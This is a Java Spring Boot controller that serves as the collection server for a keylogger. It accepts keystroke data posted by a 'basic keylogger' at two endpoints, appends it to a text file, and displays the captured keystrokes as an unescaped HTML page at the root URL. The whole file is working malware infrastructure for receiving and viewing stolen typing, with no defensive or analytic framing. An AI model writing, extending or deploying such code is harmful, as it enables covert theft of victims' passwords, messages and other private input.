package com.aetriks.relay.controller;

import com.aetriks.relay.model.KeylogPayload;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;

import java.io.*;
import java.nio.file.Files;
import java.nio.file.Paths;

@RestController
public class KeylogController {

    private static final String FILE_PATH = "keyboard_capture.txt";

    // Root GET – show the captured logs as HTML
    @GetMapping("/")
    public ResponseEntity<String> showLogs() {
        try {
            String data = new String(Files.readAllBytes(Paths.get(FILE_PATH)));
            data = data.replace("\n", "<br>");
            return ResponseEntity.ok("<h1>Logged data</h1><p>" + data + "</p>");
        } catch (IOException e) {
            return ResponseEntity.ok("<h1>Nothing logged yet.</h1>");
        }
    }

    // POST – append keylog data from basic keylogger
    @PostMapping("/")
    public ResponseEntity<String> logKeys(@RequestBody KeylogPayload payload) {
        return appendToFile(payload.getKeyboardData());
    }

    // POST – same as above but from specific /api/keystrokes endpoint
    @PostMapping("/api/keystrokes")
    public ResponseEntity<?> logKeysApi(@RequestBody KeylogPayload payload) {
        ResponseEntity<String> result = appendToFile(payload.getKeyboardData());
        if (result.getStatusCode().is2xxSuccessful()) {
            return ResponseEntity.ok().body("{\"message\": \"Successfully logged the data.\", \"stop\": false}");
        } else {
            return ResponseEntity.status(500).body("{\"message\": \"Failed to log data.\"}");
        }
    }

    // Utility method to append keystrokes to the file
    private ResponseEntity<String> appendToFile(String data) {
        try (FileWriter fw = new FileWriter(FILE_PATH, true);
             BufferedWriter bw = new BufferedWriter(fw)) {
            bw.write(data + "\n");
            return ResponseEntity.ok("Successfully logged the data.");
        } catch (IOException e) {
            return ResponseEntity.status(500).body("Failed to log data.");
        }
    }
}
